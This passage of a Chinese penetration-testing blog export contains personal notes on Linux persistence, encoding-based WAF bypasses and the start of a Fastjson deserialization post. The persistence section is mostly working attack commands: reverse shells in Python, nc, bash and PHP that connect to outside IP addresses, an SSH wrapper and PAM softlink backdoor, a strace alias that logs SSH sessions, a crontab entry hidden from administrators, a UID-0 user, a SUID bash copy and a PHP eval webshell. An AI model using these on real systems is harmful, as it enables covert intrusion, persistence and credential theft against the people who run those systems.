socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.174.129&#x27;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])&quot;</span></span><br></pre></td></tr></table></figure><p>python可能需要修改为python3</p><blockquote><p>建立socket tcp连接，将标准输入，输出，错误重定向到s.fileno()</p><p>fileno()：用来取得参数stream指定的文件流所使用的文件描述词</p></blockquote><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 124.220.192.122 1234 -e /bin/bash</span><br><span class="line">nc 47.120.7.67 7000 -e /bin/bash</span><br><span class="line"></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 120.77.73.212 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h3 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h3><ul><li><p>用nc进行反弹shell，需要nc是提供-e参数的版本，但是系统apt默认安装的都是不提供反向链接的版本。</p><p><img src="/../../../blog/source/images/image-20230830215804216.png" alt="image-20230830215804216"></p><p>解决方法：</p><ul><li><p>上传编译好的nc</p></li><li><p>利用管道符</p><p>被攻击机</p><p><img src="/../../../blog/source/images/image-20230823145240080.png" alt="image-20230823145240080"></p><p>攻击机</p><p><img src="/../../../blog/source/images/image-20230823145311118.png" alt="image-20230823145311118"></p><p><img src="/../../../blog/source/images/image-20230823145323881.png" alt="image-20230823145323881"></p><p>利用1234端口将传入内容交给bash执行，再将内容从端口8888送出去</p></li></ul></li><li><p>路由器</p><blockquote><p>在路由器系统中不存在bash，存在符号&gt;、&amp; 在反序列化中或者对符号转义的情况下就没有办法反弹了。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">锐捷</span></span><br><span class="line">mkfifo /tmp/backpipe1 | /bin/sh 0&lt;/tmp/backpipe1 | nc 127.0.0.1 6666 1&gt;/tmp/backpipe1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">飞鱼星反弹shell</span></span><br><span class="line">mkfifo /tmp/backpipe1 | /bin/sh 0&lt;/tmp/backpipe1 | /bin/busybox nc 127.0.0.1 6666 1&gt;/tmp/backpipe1</span><br></pre></td></tr></table></figure><p>这个我也没遇到过，真实性有待考量，因为不是可以利用管道符从而进行base64？</p></li></ul><h2 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h2><h3 id="SSH-wrapper"><a href="#SSH-wrapper" class="headerlink" title="SSH wrapper"></a>SSH wrapper</h3><p>被攻击机</p><blockquote><p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">会导致ssh不能用</span></span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd  </span><br><span class="line">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line"></span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><blockquote><p> \x00\x004A是13377的大端形式</p></blockquote><p>攻击机</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:IP:22,sourceport=port</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230823151639936.png" alt="image-20230823151639936"></p><p>修改通信端口</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">port = <span class="number">19526</span></span><br><span class="line">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,port)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"></span><br><span class="line">&gt;&gt;<span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd </span><br><span class="line">变为</span><br><span class="line">echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..LF/);&#x27;</span> &gt;&gt;sshd </span><br></pre></td></tr></table></figure><h3 id="SSH-软连接后门"><a href="#SSH-软连接后门" class="headerlink" title="SSH 软连接后门"></a>SSH 软连接后门</h3><blockquote><ol><li><p>PAM认证机制，若sshd服务中开启了PAM认证机制（默认开启<code>cat /etc/ssh/sshd_config|grep UsePAM</code>），当程序执行时，PAM模块则会搜寻PAM相关设定文件，设定文件一般是在&#x2F;etc&#x2F;pam.d&#x2F;。若关闭则会验证密码，无法建立软链接后门。</p></li><li><p>pam_rootok.so主要作用是使得uid为0的用户，即root用户可以直接通过认证而不需要输入密码。</p></li><li><p><code>find /etc/pam.d |xargs grep &quot;pam_rootok&quot; </code></p><p><img src="/../../../blog/source/images/image-20230830230859930.png" alt="image-20230830230859930"></p><p><strong>这些都可以作为ssh软链接后门</strong>：当我们通过特定的端口连接ssh后，应用在启动过程中就会去找到配置文件，如：我们的软链接文件为&#x2F;tmp&#x2F;su，那么应用就会找&#x2F;etc&#x2F;pam.d&#x2F;su作为配置文件，因为&#x2F;etc&#x2F;pam.d&#x2F;su使用了pam_rootok.so所以无需验证密码即可连接。</p></li></ol></blockquote><p>失败了。。</p><p><img src="/../../../blog/source/images/image-20230830222011164.png" alt="image-20230830222011164"></p><p>是因为SSH wrapper</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br></pre></td></tr></table></figure><p>需要重新安装ssh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/su /tmp/su</span><br><span class="line">/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230830230550836.png" alt="image-20230830230550836"></p><p>实际上是随便输一个密码就可以登陆，但是不能不输密码。</p><h3 id="SSH-公钥免密登陆"><a href="#SSH-公钥免密登陆" class="headerlink" title="SSH 公钥免密登陆"></a>SSH 公钥免密登陆</h3><p>之前打靶机的时候的笔记</p><p>ssh验证方式</p><p><img src="/../../../blog/source/images/image-20230304140701229-1693405604693.png" alt="image-20230304140701229"></p><p>这里第二种：假设主机A要用SSH登录到主机B，那么只要主机A有私钥，主机B有对应的公钥即可，与是主机A生产的，还是主机B生成的无关。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">host为主机名（root）</span></span><br><span class="line">ssh host@ip -p port（password验证）</span><br><span class="line">ssh host@ip -i id_rsa -p port(密钥验证，私钥权限要为600才可以使用)</span><br></pre></td></tr></table></figure><p>配置文件<code>/etc/ssh/sshd_config</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication yes #启用密码验证</span><br><span class="line">PubkeyAuthentication yes #启用密钥对验证</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys #指定公钥库文件</span><br></pre></td></tr></table></figure><p>流程</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa # 生成密钥对</span><br><span class="line">cat id_rsa.pub &gt; authorized_keys #将公钥内容放到目标.ssh/authorized_keys里 </span><br><span class="line"></span><br><span class="line">ssh-copy-id host@ip -p 22 #将公钥上传至远程服务器用户目录中</span><br></pre></td></tr></table></figure><h2 id="strace后门"><a href="#strace后门" class="headerlink" title="strace后门"></a>strace后门</h2><p>通过<strong>命令替换（命令行启动文件加入alias）</strong>动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监控ssh</span></span><br><span class="line">echo &quot;alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;&quot; &gt;&gt; /root/.bashrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">立即生效</span></span><br><span class="line">source /root/.bashrc</span><br></pre></td></tr></table></figure><p>kali没有strace，但是云服务器默认是装了的</p><p><img src="/../../../blog/source/images/image-20230830223830491.png" alt="image-20230830223830491"></p><p>查看记录的ssh连接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /tmp/.ssh.log </span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230830232440346.png" alt="image-20230830232440346"></p><h2 id="定时任务后门"><a href="#定时任务后门" class="headerlink" title="定时任务后门"></a>定时任务后门</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>crontab命令实际的作用文件是：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">RHEL:</span></span><br><span class="line">/var/spool/cron/`whoami`</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Debian:</span></span><br><span class="line">/var/spool/cron/crontabs/`whoami`</span><br></pre></td></tr></table></figure><p>定时任务还可以部署在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/cron.d/ </span><br><span class="line">/etc/cron.daily/ </span><br><span class="line">/etc/cron.weekly/ </span><br><span class="line">/etc/cron.hourly/ </span><br><span class="line">/etc/cron.monthly/</span><br></pre></td></tr></table></figure><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo xxx &gt; /tmp/1.elf</span><br><span class="line">chmod +x /tmp/1.elf</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230830235507613.png" alt="image-20230830235507613"></p><p>将no crontab for <code>whoami</code>文件写到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root中，而crontab -l就是列出了该文件的内容。所以当管理员使用crontab -l查看定时任务时，就会看到no crontab for root，从而起到了隐藏的效果。</p><p><img src="/../../../blog/source/images/image-20230830235746458.png" alt="image-20230830235746458"></p><h2 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230831001351639.png" alt="image-20230831001351639"></p><h2 id="Suid后门"><a href="#Suid后门" class="headerlink" title="Suid后门"></a>Suid后门</h2><blockquote><p><strong>SUID权限仅对二进制程序有效</strong></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/.long #将bash命令cp到.long二进制程序中</span><br><span class="line">chmod u+s /tmp/.long #赋予SUID文件的权限</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/tmp/.long -p </span><br></pre></td></tr></table></figure><blockquote><p>bash2 针对suid有一些防护，所以需要加上-p参数来获取一个root的shell。</p></blockquote><p><img src="/../../../blog/source/images/image-20230831155343319.png" alt="image-20230831155343319"></p><h2 id="隐藏文件-x2F-目录技巧"><a href="#隐藏文件-x2F-目录技巧" class="headerlink" title="隐藏文件&#x2F;目录技巧"></a>隐藏文件&#x2F;目录技巧</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">chattr +i 是一个 Linux 命令，用于将文件或目录设置为不可修改（immutable）。当应用了 +i 属性后，文件或目录将无法被修改、删除、重命名或链接。这个属性主要用于保护关键系统文件或目录，防止它们被意外或恶意篡改。请注意，这个命令需要在具有管理员权限的用户下执行</span></span><br><span class="line">chattr +i hack.sh  #lsattr才可以看到该权限</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230831163015163.png" alt="image-20230831163015163"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">.开头的文件需要用<span class="built_in">ls</span> -al  .和..、分别代指的是当前目录和上级目录</span></span><br><span class="line">echo &#x27;whoami&#x27;  &gt; ..\ \ \ \ # 注意最后一个转义符后有一个空格</span><br><span class="line">bash ..\ \ \ \ \ # 这里也是多一个空格。</span><br></pre></td></tr></table></figure><blockquote><p>失败</p></blockquote><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/RuoJi6/HackerPermKeeper">RuoJi6&#x2F;HackerPermKeeper (github.com)</a></p><h1 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h1><p><a href="https://xz.aliyun.com/t/9718#toc-13">Windows权限维持总结 - 先知社区 (aliyun.com)</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>拓展：<a href="https://github.com/aplyc1a/blogs/tree/master/%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6/Linux">blogs&#x2F;持久控制&#x2F;Linux at master · aplyc1a&#x2F;blogs (github.com)</a></p><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/02.Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html#%E6%B7%BB%E5%8A%A0%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7">02.Linux权限维持 · d4m1ts 知识库 (gm7.org)</a></p><h1 id="传参执行"><a href="#传参执行" class="headerlink" title="传参执行"></a>传参执行</h1><h2 id="重定向写入"><a href="#重定向写入" class="headerlink" title="重定向写入"></a>重定向写入</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;&gt;b.php</span><br></pre></td></tr></table></figure><blockquote><p>注意如果使用双引号$需要转义</p><p>然后在测试thinkphp rce的时候发现最后要加一个空格</p></blockquote><p>![image-20230403151335228](E:\typora img\image-20230403151335228.png)</p><p>上面的是加了空格的</p><p>下面的是没加空格的</p><h1 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c  &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>键入 Ctrl-Z，回到 VPS 的命令行中；第二步，在 VPS 中执行：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stty raw -echo</span><br><span class="line">fg</span><br></pre></td></tr></table></figure><p>回到哑 shell 中；第三步，在哑 shell 中键入 Ctrl-l，执行：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reset</span><br><span class="line">export SHELL=bash</span><br><span class="line">export TERM=xterm-256color</span><br><span class="line">stty rows 54 columns 104</span><br></pre></td></tr></table></figure><h2 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;rce.php&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;eval&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sysytem&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>=<span class="title function_ invoke__">system</span>(%<span class="number">22</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.220.192.120%2F1234%20%3E%261&#x27;</span>%<span class="number">22</span>)%<span class="number">3</span>B  成功</span><br><span class="line"></span><br><span class="line">sysytem=python3%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;import socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.41.134%22%2C8888))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D)%3B&#x27;</span> 成功</span><br><span class="line">    </span><br><span class="line">system=bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.220.192.120%2F1234%200%3E%261&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;\$sock=fsockopen(\&quot;192.168.41.134\&quot;,8888);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编码学习</title>
      <link href="/2023/05/01/%E7%BC%96%E7%A0%81/"/>
      <url>/2023/05/01/%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="编码的由来"><a href="#编码的由来" class="headerlink" title="编码的由来"></a>编码的由来</h2><p>计算机存储的任何数据，包括各种文本、图片、音视频文件等等，实际上都是一串<a href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">二进制</a>数字01字节序列组成的。</p><p>字节一般用来存储与网络传输，这样可以节省存储空间与网络传输带宽。而字符主要是用于显示，方便大家阅读。</p><p>编码主要是为了存储传输，而解码是为了方便阅读</p><h2 id="编码方式的确立"><a href="#编码方式的确立" class="headerlink" title="编码方式的确立"></a>编码方式的确立</h2><p>可以通过http消息头的accept-encoding指定</p><p>html中的charset&#x3D;”UTF-8″</p><p>应用本身的编码方式</p><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>编码表</p><blockquote><p>大小写字母，[0,9]，+，&#x2F;</p></blockquote><p>加密</p><blockquote><p>每6个字符为一组</p></blockquote><p>解密</p><blockquote><p>每8个字符为一组</p></blockquote><p>加密时不足的会补上<code>=</code></p><h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h2><p>明&#x2F;密文空间：字母表</p><p>操作：右移13位</p><p>可逆运算</p><h2 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h2><p><a href="https://blog.csdn.net/freeking101/article/details/68922983">URL原理、URL编码、URL特殊字符</a></p><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p><a href="https://www.cnblogs.com/zuge/p/6141359.html">URL中的保留和不安全字符 - atzuge - 博客园</a></p><p><img src="file://E:/typora%20img/image-20220204213349476.png?lastModify=1668780642" alt="image-20220204213349476"></p><h4 id="在哪里发生"><a href="#在哪里发生" class="headerlink" title="在哪里发生"></a>在哪里发生</h4><p>当我们向服务器发送数据时，浏览器就会自动将需要编码的字符进行URL编码（可以在数据包中看到）,然后服务器接收到数据包后，也会自动解码URL编码后的字符。</p><h2 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii"></a>Ascii</h2><p>长度：固定1字节</p><p>0~126个字符，其中前32个字符为不可打印字符</p><h2 id="Unicode字符集–万国码"><a href="#Unicode字符集–万国码" class="headerlink" title="Unicode字符集–万国码"></a>Unicode字符集–万国码</h2><p>形式：U+数字  或者 16进制形式\u8fd9\u662f\u4e00</p><p>长度：固定<strong>2字节</strong></p><p><a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></p><p>![image-20220624223033281](E:\typora img\image-20220624223033281.png)</p><h3 id="UTF"><a href="#UTF" class="headerlink" title="UTF"></a>UTF</h3><p>UTF是Unicode Transformation Format(统一码转换格式)，变长Unicode编码。</p><p>常见的有UTF-8,UTF-16,UTF-32</p><h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h2><p><a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p><p><a href="https://blog.csdn.net/qq_36539075/article/details/79946099">https://blog.csdn.net/qq_36539075/article/details/79946099</a></p><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>&amp;#36825</p><h2 id="编码安全"><a href="#编码安全" class="headerlink" title="编码安全"></a>编码安全</h2><h3 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h3><p><a href="https://forum.butian.net/share/639">奇安信攻防社区-从RFC看如何使用Base64编码绕过WAF</a></p><h3 id="编码前后不一致"><a href="#编码前后不一致" class="headerlink" title="编码前后不一致"></a>编码前后不一致</h3><ul><li><p>SQL宽字节注入</p></li><li><p>文件编码不同，导致报错</p><p>[NSSRound#6 Team]check(Revenge)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.islink(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">oct</span>(os.stat(filepath).st_mode)[-<span class="number">3</span>:] != <span class="string">&#x27;444&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br></pre></td></tr></table></figure><p><code>with open(filepath, &#39;r&#39;) as f</code>，这里mode为r，默认为utf-8编码。</p><p>所以当我们将gbk编码的文件上传后，读取时就会报错，从而出现debug界面</p><p>![image-20221021205739631](E:\typora img\image-20221021205739631.png)</p><p>这时候就可以尝试进行Flask的PIN码破解</p></li></ul><h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><blockquote><p>原理简单来说就是对字符串的标准化操作导致unicode字符转换成了与他同形的ascii字符。</p></blockquote><p><a href="https://1idb.com/?p=642">Web 基于ASIS 2019：Unicorn shop学习Unicode安全隐患 – 大彪的小站</a></p><p>查询：</p><p><a href="https://unicode-table.com/cn/blocks/">https://unicode-table.com/cn/blocks/</a></p><p><a href="https://unicode-table.com/cn/sets/symbols-for-nickname/#arabic-and-roman-numerals">https://unicode-table.com/cn/sets/symbols-for-nickname/#arabic-and-roman-numerals</a></p><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p><a href="https://www.w3cschool.cn/json/28yd1mw2.html">json编码</a></p><blockquote><p>字符串支持unicode编码</p></blockquote><img src="E:\typora img\image-20220725194348092.png" alt="image-20220725194348092"  /><h4 id="过滤位置出错"><a href="#过滤位置出错" class="headerlink" title="过滤位置出错"></a>过滤位置出错</h4><p>后端接收JSON数据，没有先对其进行解码等处理，而直接对其进行操作如判断，过滤</p><ul><li><p>过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    xxxx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">waf</span>(<span class="variable">$body</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><blockquote><p>对于这种情况，只需要对提交的JSON数据进行UNICODE编码即可绕过waf。</p></blockquote></li><li><p>判断比较</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$numbers</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">#获取ajax请求的数据</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;           </span><br></pre></td></tr></table></figure><blockquote><p>将$numbers的每一位与待比较数字逐字比较</p><p>因为json支持数组和布尔类型的数据，所以可以构造json数据为{numbers:[true,true,true,true,true,true,true]}</p><p>只要待比较数字$win_numbers的每一位都大于0，即可输出flag</p></blockquote></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.w3school.com.cn/charsets/index.asp">HTML字符集 (w3school.com.cn)</a></p><p><a href="https://cloud.tencent.com/developer/article/1748394">30余种加密编码类型的密文特征分析（建议收藏） - 云+社区 - 腾讯云 (tencent.com)</a></p><p><a href="https://segmentfault.com/a/1190000019437999">python中的编码</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson漏洞</title>
      <link href="/2023/05/01/fastjson/"/>
      <url>/2023/05/01/fastjson/</url>
      
        <content type="html"><![CDATA[<h1 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h1><blockquote><p>Fastjson是阿里巴巴公司开源的一款json解析器，它可以解析 JSON 格式的字符串，支持<strong>将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到JavaBean</strong>。</p></blockquote><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>From<a href="https://xz.aliyun.com/t/12096#toc-4">从0到1的fastjson的反序列化漏洞分析 - 先知社区 (aliyun.com)</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>1.2.24：fastjson在解析json的过程中，支持使用<code>autoType</code>来实例化<strong>某一个具体的类</strong>，并调用该类的<code>setter/getter</code>方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。 </p><p>1.2.47：fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p></blockquote><h3 id="User类"><a href="#User类" class="headerlink" title="User类"></a>User类</h3><figure class="highlight java"><table><tr><td 